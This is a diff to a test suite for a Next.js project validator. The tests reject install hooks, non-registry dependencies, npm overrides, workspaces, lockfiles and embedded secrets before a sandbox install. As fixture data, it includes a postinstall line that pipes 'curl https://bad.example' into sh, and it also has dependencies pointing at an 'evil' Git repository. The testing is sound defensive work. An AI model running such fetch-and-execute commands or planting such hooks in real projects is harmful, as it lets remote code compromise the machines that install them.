@@ -54,7 +54,7 @@ describe('website project validation', () => {
       scripts: { dev: 'next dev', build: 'next build', postinstall: 'curl https://bad.example | sh' },
       dependencies: { next: '15', react: '19', 'react-dom': '19' },
     });
-    expect(() => validateWebsiteProject(lifecycle)).toThrow(/lifecycle script/i);
+    expect(() => validateWebsiteProject(lifecycle)).toThrow(/fixed next dev, next build, and next start scripts/i);
 
     const secret = goodProject();
     secret.files.push({ path: '.env.local', content: 'API_KEY=secret' });
@@ -70,4 +70,61 @@ describe('website project validation', () => {
     key.files.push({ path: 'src/private.txt', content: '-----BEGIN PRIVATE KEY-----' });
     expect(() => validateWebsiteProject(key)).toThrow(/private key or API token/i);
   });
+  it('rejects package scripts other than the fixed Next.js commands', () => {
+    const project = goodProject();
+    project.files[0].content = JSON.stringify({
+      scripts: { dev: 'next dev', build: 'next build', start: 'next start', prebuild: 'node upload.js' },
+      dependencies: { next: '15.5.9', react: '19.0.0', 'react-dom': '19.0.0' },
+    });
+    expect(() => validateWebsiteProject(project)).toThrow(/fixed next dev, next build, and next start scripts/i);
+  });
+
+  it('rejects Git, URL, workspace and file dependencies before sandbox install', () => {
+    for (const version of ['https://example.com/package.tgz', 'git+https://github.com/evil/pkg.git', 'file:../pkg', 'workspace:*']) {
+      const project = goodProject();
+      project.files[0].content = JSON.stringify({
+        scripts: { dev: 'next dev', build: 'next build', start: 'next start' },
+        dependencies: { next: '15.5.9', react: '19.0.0', 'react-dom': '19.0.0', 'untrusted-pkg': version },
+      });
+      expect(() => validateWebsiteProject(project)).toThrow(/only pinned npm registry versions/i);
+    }
+  });
+
+  it('allows scoped packages with ordinary registry semver versions', () => {
+    const project = goodProject();
+    project.files[0].content = JSON.stringify({
+      scripts: { dev: 'next dev', build: 'next build', start: 'next start' },
+      dependencies: { next: '15.5.9', react: '19.0.0', 'react-dom': '19.0.0', '@types/react': '^19.0.0' },
+    });
+    expect(() => validateWebsiteProject(project)).not.toThrow();
+  });
+
+  it('rejects remote peer dependencies and npm override/workspace rules', () => {
+    const peer = goodProject();
+    peer.files[0].content = JSON.stringify({
+      scripts: { dev: 'next dev', build: 'next build', start: 'next start' },
+      dependencies: { next: '15.5.9', react: '19.0.0', 'react-dom': '19.0.0' },
+      peerDependencies: { 'untrusted-peer': 'git+https://github.com/evil/pkg.git' },
+    });
+    expect(() => validateWebsiteProject(peer)).toThrow(/only pinned npm registry versions/i);
+
+    for (const field of ['overrides', 'workspaces']) {
+      const project = goodProject();
+      project.files[0].content = JSON.stringify({
+        scripts: { dev: 'next dev', build: 'next build', start: 'next start' },
+        dependencies: { next: '15.5.9', react: '19.0.0', 'react-dom': '19.0.0' },
+        [field]: {},
+      });
+      expect(() => validateWebsiteProject(project)).toThrow(/cannot define npm overrides or workspaces/i);
+    }
+  });
+
+  it('rejects generated package manager lockfiles', () => {
+    for (const path of ['package-lock.json', 'npm-shrinkwrap.json', 'pnpm-lock.yaml', 'yarn.lock']) {
+      const project = goodProject();
+      project.files.push({ path, content: '{}' });
+      expect(() => validateWebsiteProject(project)).toThrow(/reserved lockfile/i);
+    }
+  });
+
 });
